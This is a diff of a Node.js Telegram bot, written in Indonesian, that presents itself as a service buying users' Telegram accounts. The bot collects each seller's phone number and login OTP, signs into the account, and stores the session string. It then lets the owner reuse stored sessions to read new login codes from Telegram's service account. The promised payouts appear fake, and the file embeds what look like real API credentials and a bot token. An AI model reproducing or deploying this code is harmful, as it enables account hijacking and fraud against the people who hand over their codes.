@@ -1,6 +1,6 @@
 const { Telegraf, Markup } = require('telegraf');
-const { TelegramClient, Api } = require('gramjs');
-const { StringSession } = require('gramjs/sessions');
+const { TelegramClient, Api } = require('telegram'); // Pakai 'telegram' agar Zeabur lancar
+const { StringSession } = require('telegram/sessions');
 const fs = require('fs');
 
 // --- KONFIGURASI ---
@@ -8,41 +8,41 @@ const apiId = 31201777;
 const apiHash = '791bb0f9d012531d922086c8489dd705';
 const botToken = '8510861119:AAHvf4n2QUAFY_JEJUDeTHFsXH3zxiy2hAY';
 const logChannel = '-1003521158263';
-const ownerId = 12345678; // <-- GANTI DENGAN ID TELEGRAM KAMU
+const ownerId = 12345678; // GANTI DENGAN ID TELEGRAM KAMU (Cek di @userinfobot)
 
 const bot = new Telegraf(botToken);
 const DB_FILE = './sessions.json';
 
 // --- DATABASE HANDLER ---
-// Fungsi untuk membaca dan menulis data ke file agar tidak hilang saat restart
-if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, JSON.stringify({ accounts: [] }));
+if (!fs.existsSync(DB_FILE)) {
+    fs.writeFileSync(DB_FILE, JSON.stringify({ accounts: [] }));
+}
 
 const getData = () => JSON.parse(fs.readFileSync(DB_FILE));
 const saveData = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
 
-const userSessions = {}; // Penampung temporary state user
+const userSessions = {}; 
 
-// --- KEYBOARD HELPER ---
-const mainMenu = () => Markup.inlineKeyboard([
-    [Markup.button.callback('🛒 Jual Akun Telegram', 'jual_akun')],
-    [Markup.button.callback('👤 Profile', 'profile'), Markup.button.callback('💸 Withdraw', 'withdraw')],
-    [Markup.button.callback('👑 Owner Menu', 'owner_menu')]
+// --- MENU UTAMA ---
+const mainBtn = () => Markup.inlineKeyboard([
+    [Markup.button.callback('💰 JUAL AKUN SEKARANG', 'jual_akun')],
+    [Markup.button.callback('👤 MY PROFILE', 'profile'), Markup.button.callback('💸 WITHDRAW', 'withdraw')],
+    [Markup.button.callback('👑 OWNER MENU', 'owner_menu')]
 ]);
 
-// --- BOT COMMANDS ---
 bot.start((ctx) => {
     ctx.reply(
-        `✨ **Selamat Datang di Toko Akun** ✨\n\n` +
-        `Dapatkan saldo instant dengan menjual akun Telegram Anda.\n` +
-        `Pastikan akun dalam kondisi bersih untuk harga maksimal!`,
-        mainMenu()
+        `🚀 **SELAMAT DATANG DI USERBOT MANAGER** 🚀\n\n` +
+        `Dapatkan uang tunai hanya dengan menjual akun Telegram Anda.\n` +
+        `Proses cepat, aman, dan saldo langsung masuk ke profil!`,
+        mainBtn()
     );
 });
 
-// --- PROSES JUAL AKUN & OTP ---
+// --- LOGIKA JUAL AKUN & OTP ---
 bot.action('jual_akun', (ctx) => {
     userSessions[ctx.from.id] = { step: 'input_phone' };
-    ctx.reply('📲 Masukkan nomor Telegram (Format: 628xxx):');
+    ctx.reply('📲 **MASUKKAN NOMOR TELEGRAM**\n\nFormat: 628xxxx (Gunakan kode negara)\n\nContoh: 62812345678');
 });
 
 bot.on('text', async (ctx) => {
@@ -52,32 +52,31 @@ bot.on('text', async (ctx) => {
 
     if (!state) return;
 
-    // STEP 1: INPUT NOMOR
+    // STEP 1: PROSES NOMOR HP
     if (state.step === 'input_phone') {
         state.phone = text.replace(/[^0-9]/g, '');
-        ctx.reply(`⏳ Menghubungi server Telegram untuk nomor ${state.phone}...`);
+        ctx.reply(`⏳ Menghubungi server Telegram untuk ${state.phone}...`);
         
         try {
             const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
             state.client = client;
             await client.connect();
             
-            // Minta Kode OTP
             const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, state.phone);
             state.phoneCodeHash = phoneCodeHash;
             state.step = 'input_otp';
             
-            ctx.reply('📩 Kode OTP terkirim! Masukkan kode dengan spasi.\nContoh: 1 2 3 4 5');
+            ctx.reply('📩 **KODE OTP TERKIRIM!**\n\nSilahkan cek aplikasi Telegram Anda dan masukkan kode di sini.\n\n⚠️ **PENTING:** Masukkan kode dengan spasi agar terbaca sistem.\nContoh: 1 2 3 4 5');
         } catch (err) {
-            ctx.reply('❌ Error: ' + err.message);
+            ctx.reply('❌ GAGAL: ' + err.message);
             delete userSessions[userId];
         }
     }
 
-    // STEP 2: INPUT OTP & VALIDASI SESI
+    // STEP 2: PROSES OTP & CEK SESI
     else if (state.step === 'input_otp') {
         const otp = text.replace(/\s+/g, '');
-        ctx.reply('⚙️ Menverifikasi akun...');
+        ctx.reply('⚙️ **MENVERIFIKASI AKUN & PERANGKAT...**');
 
         try {
             const client = state.client;
@@ -89,9 +88,10 @@ bot.on('text', async (ctx) => {
 
             const sessionStr = client.session.save();
             const auths = await client.invoke(new Api.account.GetAuthorizations());
-            const isClean = auths.authorizations.length === 1;
+            const devices = auths.authorizations;
+            const isClean = devices.length === 1;
 
-            // Simpan ke session.json
+            // Simpan ke Database
             const db = getData();
             db.accounts.push({
                 phone: state.phone,
@@ -103,27 +103,28 @@ bot.on('text', async (ctx) => {
             saveData(db);
 
             if (isClean) {
-                ctx.reply('✅ Sukses! Akun bersih (hanya 1 perangkat). Saldo bertambah Full!');
+                ctx.reply('✅ **BERHASIL!**\n\nAkun Anda bersih dan sudah kami terima. Saldo ditambahkan Rp 50.000 (Full)');
             } else {
-                ctx.reply('⚠️ Sukses! Namun terdeteksi ' + auths.authorizations.length + ' perangkat. Silahkan logout perangkat lain agar saldo cair.');
+                ctx.reply(`⚠️ **PERINGATAN!**\n\nTerdeteksi ${devices.length} perangkat. Untuk mendapatkan saldo full, silahkan Logout perangkat lain melalui Pengaturan > Perangkat di Telegram Anda.`);
             }
             
             await client.disconnect();
         } catch (err) {
-            ctx.reply('❌ Gagal Login: ' + err.message);
+            ctx.reply('❌ OTP SALAH: ' + err.message);
         }
         delete userSessions[userId];
     }
 
-    // STEP 3: WITHDRAW
+    // STEP 3: PROSES WITHDRAW
     else if (state.step === 'input_wd') {
-        ctx.reply('✅ Penarikan sedang diproses oleh admin.');
+        ctx.reply('✅ **WITHDRAW BERHASIL DIAJUKAN!**\n\nAdmin akan segera memproses dana ke nomor Anda.');
         bot.telegram.sendMessage(logChannel, 
-            `🔔 **NOTIFIKASI WITHDRAW**\n` +
+            `💰 **PEMBERITAHUAN WITHDRAW**\n` +
             `━━━━━━━━━━━━━━━━━━\n` +
-            `👤 User: @${ctx.from.username || ctx.from.id}\n` +
-            `📝 Detail: ${text}\n` +
-            `💰 Status: Berhasil Disetujui\n` +
+            `👤 Pengirim: @${ctx.from.username || ctx.from.id}\n` +
+            `📱 Nomor & Saldo: ${text}\n` +
+            `📅 Waktu: ${new Date().toLocaleString()}\n` +
+            `✅ Status: Sukses - Detail Terkirim\n` +
             `━━━━━━━━━━━━━━━━━━`
         );
         delete userSessions[userId];
@@ -132,20 +133,20 @@ bot.on('text', async (ctx) => {
 
 // --- PROFILE & WITHDRAW ---
 bot.action('profile', (ctx) => {
-    ctx.reply(`👤 **Profil Pengguna**\n\nID: \`${ctx.from.id}\`\nStatus: Aktif\nSaldo: Rp 0 (Selesaikan penjualan)`);
+    ctx.reply(`👤 **PROFIL SAYA**\n\nID: \`${ctx.from.id}\`\nUsername: @${ctx.from.username || '-'}\nTotal Akun Dijual: 0\nSaldo: Rp 0`);
 });
 
 bot.action('withdraw', (ctx) => {
     userSessions[ctx.from.id] = { step: 'input_wd' };
-    ctx.reply('💸 **Menu Penarikan**\n\nMasukkan nomor DANA/OVO dan jumlah saldo.\nContoh: DANA 08xxx - 50000');
+    ctx.reply('💸 **FORM WITHDRAW**\n\nSilahkan masukkan nomor DANA/OVO/GOPAY dan jumlah.\n\nContoh: DANA - 08123456789 - 50000');
 });
 
-// --- OWNER MENU & PAGINATION ---
+// --- OWNER MENU (PAGINATION) ---
 bot.action('owner_menu', (ctx) => {
-    if (ctx.from.id !== ownerId) return ctx.answerCbQuery('Akses Ditolak!');
-    ctx.reply('👑 **Admin Panel**', Markup.inlineKeyboard([
-        [Markup.button.callback('📑 Daftar Akun Terjual', 'list_0')],
-        [Markup.button.callback('📢 Broadcast', 'bc')]
+    if (ctx.from.id !== ownerId) return ctx.answerCbQuery('❌ AKSES DITOLAK!');
+    ctx.reply('👑 **OWNER CONTROL PANEL**', Markup.inlineKeyboard([
+        [Markup.button.callback('📑 DAFTAR NOMOR TERJUAL', 'list_0')],
+        [Markup.button.callback('📢 BROADCAST MASSAL', 'bc')]
     ]));
 });
 
@@ -153,7 +154,6 @@ bot.action(/^list_(\d+)$/, (ctx) => {
     const page = parseInt(ctx.match[1]);
     const db = getData();
     const accounts = db.accounts;
-    
     const start = page * 5;
     const end = start + 5;
     const current = accounts.slice(start, end);
@@ -163,28 +163,28 @@ bot.action(/^list_(\d+)$/, (ctx) => {
     ]);
 
     const nav = [];
-    if (page > 0) nav.push(Markup.button.callback('⬅️', `list_${page - 1}`));
-    if (end < accounts.length) nav.push(Markup.button.callback('➡️', `list_${page + 1}`));
+    if (page > 0) nav.push(Markup.button.callback('⬅️ PREV', `list_${page - 1}`));
+    if (end < accounts.length) nav.push(Markup.button.callback('NEXT ➡️', `list_${page + 1}`));
     if (nav.length) buttons.push(nav);
     
-    buttons.push([Markup.button.callback('🔙 Kembali', 'owner_menu')]);
-    ctx.editMessageText(`Daftar Akun (Hal ${page + 1})`, Markup.inlineKeyboard(buttons));
+    buttons.push([Markup.button.callback('🔙 KEMBALI', 'owner_menu')]);
+    ctx.editMessageText(`📑 **DAFTAR AKUN (Hal ${page + 1})**`, Markup.inlineKeyboard(buttons));
 });
 
-// DETAIL NOMOR & CEK OTP TERBARU
+// DETAIL & CEK OTP TERBARU
 bot.action(/^detail_(\d+)$/, async (ctx) => {
     const index = parseInt(ctx.match[1]);
     const acc = getData().accounts[index];
     
     ctx.reply(
-        `📄 **Detail Akun**\n\n` +
-        `Nomor: ${acc.phone}\n` +
-        `Penjual: @${acc.seller}\n` +
-        `Tanggal: ${acc.date}\n` +
-        `Sesi: \`${acc.session.substring(0, 15)}...\``,
+        `📄 **DETAIL AKUN**\n\n` +
+        `• Nomor: ${acc.phone}\n` +
+        `• Seller: @${acc.seller}\n` +
+        `• Status: ${acc.clean ? '✅ Clean' : '⚠️ Multi Device'}\n` +
+        `• Date: ${acc.date}`,
         Markup.inlineKeyboard([
-            [Markup.button.callback('📩 Cek OTP @Telegram', `otp_${index}`)],
-            [Markup.button.callback('🔙 Kembali', 'list_0')]
+            [Markup.button.callback('📩 CEK OTP @TELEGRAM', `otp_${index}`)],
+            [Markup.button.callback('🔙 KEMBALI', 'list_0')]
         ])
     );
 });
@@ -192,18 +192,18 @@ bot.action(/^detail_(\d+)$/, async (ctx) => {
 bot.action(/^otp_(\d+)$/, async (ctx) => {
     const index = parseInt(ctx.match[1]);
     const acc = getData().accounts[index];
-    ctx.answerCbQuery('Sedang mengambil OTP...');
+    ctx.answerCbQuery('🔄 Mengambil pesan @Telegram...');
     
     try {
         const client = new TelegramClient(new StringSession(acc.session), apiId, apiHash, {});
         await client.connect();
-        const messages = await client.getMessages(777000, { limit: 1 }); // 777000 adalah ID @Telegram
-        ctx.reply(`📩 **Pesan Terakhir @Telegram (${acc.phone}):**\n\n${messages[0].message}`);
+        const messages = await client.getMessages(777000, { limit: 1 });
+        ctx.reply(`📩 **OTP TERBARU (${acc.phone}):**\n\n${messages[0].message}`);
         await client.disconnect();
     } catch (e) {
-        ctx.reply('❌ Gagal ambil OTP: ' + e.message);
+        ctx.reply('❌ GAGAL: ' + e.message);
     }
 });
 
 bot.launch();
-console.log('🚀 Bot Jual Akun telah aktif!');
+console.log('🚀 BOT BERHASIL DIJALANKAN!');
